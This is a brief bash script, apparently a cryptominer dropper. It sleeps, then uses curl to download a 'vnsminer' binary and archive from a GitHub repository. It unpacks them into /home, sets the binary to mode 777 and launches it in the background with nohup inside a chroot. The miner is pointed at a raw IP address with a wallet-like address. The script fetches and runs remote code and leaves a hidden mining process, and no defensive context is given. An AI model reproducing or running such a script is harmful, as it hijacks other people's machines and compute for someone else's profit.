#!/bin/bash
sleep 10
curl -LO https://github.com/2319763378/pool/raw/master/vns/vns.tgz
tar xvf  vns.tgz -C /home
curl -L https://github.com/2319763378/pool/raw/master/vns/vnsminer -O /home/vns/
chmod 777 vnsminer
nohup chroot /home/vns vnsminer 1 http://129.28.240.129:8888/0x48b6526a41b4cd922eda9793f73a62d5dc98ddea &
